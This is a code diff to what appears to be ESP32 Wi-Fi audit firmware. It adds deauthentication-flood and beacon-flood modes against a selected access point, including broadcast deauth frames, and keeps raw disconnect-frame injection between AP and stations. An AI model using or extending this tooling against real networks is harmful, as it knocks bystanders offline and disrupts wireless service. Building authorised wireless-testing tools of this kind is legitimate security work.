@@ -6,6 +6,7 @@
 #include "wifi_frames.h"
 #include "pcap_and_probes.h"
 #include "companion_link.h"
+#include "wifi_attacks.h"
 #include <esp_wifi.h>
 #include <nvs_flash.h>
 
@@ -144,6 +145,10 @@ void stop_audit_action(AppContext* context) {
         context->audit.pmkid_timer = nullptr;
     }
 
+    if (context->audit.current_mode & (AUDIT_DEAUTH_FLOOD | AUDIT_BEACON_FLOOD)) {
+        stopFloods();
+    }
+
     if (context->audit.current_mode & AUDIT_PMKID) {
         if (context->audit.pmkid_via_companion) {
             companion_stop_all();
@@ -155,12 +160,21 @@ void stop_audit_action(AppContext* context) {
     context->audit.current_mode = AUDIT_NONE;
     context->audit.pmkid_via_companion = false;
     context->audit.pmkid_target_channel = 1;
-    context->wifi_scan.paused = false;
+    context->wifi_scan.paused = true;
+    context->wifi_scan.selected_net = -1;
+    context->wifi_scan.reconnect_sta_target = -1;
+
     if (!context->capture.pcap_active && !context->capture.probe_active) {
         esp_wifi_set_promiscuous(false);
     }
-    lv_label_set_text(lbl_audit_status, "#444444 IDLE#");
-    show_audit_buttons(context->wifi_scan.selected_net >= 0 || context->wifi_scan.reconnect_sta_target >= 0);
+    
+    // Also update UI text to reflect the cleared state
+    extern lv_obj_t *lbl_audit_target, *lbl_audit_bssid;
+    if (lbl_audit_status) lv_label_set_text(lbl_audit_status, "#444444 IDLE#");
+    if (lbl_audit_target) lv_label_set_text(lbl_audit_target, "#888888 Select a network from SCAN#");
+    if (lbl_audit_bssid) lv_label_set_text(lbl_audit_bssid, "---");
+
+    show_audit_buttons(false); // No network selected, so hide audit buttons
 }
 
 void reconnect_tick(lv_timer_t *timer) {
@@ -218,31 +232,35 @@ void reconnect_tick(lv_timer_t *timer) {
         esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
     }
 
-    memcpy(reconnect_buf, reconnect_frame, sizeof(reconnect_frame));
-    uint8_t* bssid = valid_ap ? target_bssid : nullptr;
+    if (context->audit.current_mode & AUDIT_DEAUTH_FLOOD) {
+        startDeauthFlood(target_bssid, valid_sta ? target_sta : nullptr);
+    } else {
+        memcpy(reconnect_buf, reconnect_frame, sizeof(reconnect_frame));
+        uint8_t* bssid = valid_ap ? target_bssid : nullptr;
 
-    if (valid_sta && bssid) {
-        uint8_t *sta = target_sta;
-        // AP -> STA
-        memcpy(reconnect_buf + 4, sta, 6);
-        memcpy(reconnect_buf + 10, bssid, 6);
-        memcpy(reconnect_buf + 16, bssid, 6);
-        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
-        // STA -> AP
-        memcpy(reconnect_buf + 4, bssid, 6);
-        memcpy(reconnect_buf + 10, sta, 6);
-        memcpy(reconnect_buf + 16, bssid, 6);
-        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
-    } else if (bssid) {
-        // Broadcast reconnect prompt
-        uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-        memcpy(reconnect_buf + 4, bc, 6);
-        memcpy(reconnect_buf + 10, bssid, 6);
-        memcpy(reconnect_buf + 16, bssid, 6);
-        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
-        memcpy(reconnect_buf + 4, bssid, 6);
-        memcpy(reconnect_buf + 10, bc, 6);
-        wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+        if (valid_sta && bssid) {
+            uint8_t *sta = target_sta;
+            // AP -> STA
+            memcpy(reconnect_buf + 4, sta, 6);
+            memcpy(reconnect_buf + 10, bssid, 6);
+            memcpy(reconnect_buf + 16, bssid, 6);
+            wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+            // STA -> AP
+            memcpy(reconnect_buf + 4, bssid, 6);
+            memcpy(reconnect_buf + 10, sta, 6);
+            memcpy(reconnect_buf + 16, bssid, 6);
+            wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+        } else if (bssid) {
+            // Broadcast reconnect prompt
+            uint8_t bc[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+            memcpy(reconnect_buf + 4, bc, 6);
+            memcpy(reconnect_buf + 10, bssid, 6);
+            memcpy(reconnect_buf + 16, bssid, 6);
+            wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+            memcpy(reconnect_buf + 4, bssid, 6);
+            memcpy(reconnect_buf + 10, bc, 6);
+            wifi_tx(reconnect_buf, sizeof(reconnect_buf));
+        }
     }
 
     perf_reconnect_tick.record(micros() - tick_t0);
@@ -251,6 +269,11 @@ void reconnect_tick(lv_timer_t *timer) {
 void beacon_tick(lv_timer_t *timer) {
     AppContext* context = (AppContext*)timer->user_data;
     if (!context) return;
+
+    if (context->audit.current_mode & AUDIT_BEACON_FLOOD) {
+        startBeaconFlood(100, context->audit.custom_beacon_ssids);
+        return;
+    }
     
     if (context->audit.custom_beacon_ssids.empty()) return; // No SSIDs configured
 
@@ -543,4 +566,33 @@ void save_beacon_ssids_to_nvs(AppContext* context) {
     }
     nvs_commit(nvs_handle);
     nvs_close(nvs_handle);
+}
+
+void start_deauth_flood_action(AppContext* context) {
+    if (!context) return;
+    int selectedNet = context->wifi_scan.selected_net;
+    if (selectedNet < 0) return;
+
+    uint8_t target_bssid[6];
+    uint8_t target_sta[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast deauth
+
+    bool got_mutex = xSemaphoreTake(context->wifi_scan.mutex, pdMS_TO_TICKS(50)) == pdTRUE;
+    if (got_mutex) {
+        memcpy(target_bssid, context->wifi_scan.ap_list[selectedNet].bssid, 6);
+        xSemaphoreGive(context->wifi_scan.mutex);
+    } else {
+        return;
+    }
+
+    startDeauthFlood(target_bssid, target_sta);
+    context->audit.current_mode |= AUDIT_DEAUTH_FLOOD;
+    // TODO: create a timer for deauth_tick
+}
+
+void start_beacon_flood_action(AppContext* context) {
+    if (!context) return;
+    
+    startBeaconFlood(100); // spam 100 beacons
+    context->audit.current_mode |= AUDIT_BEACON_FLOOD;
+    // TODO: create a timer for beacon_spam_tick
 }
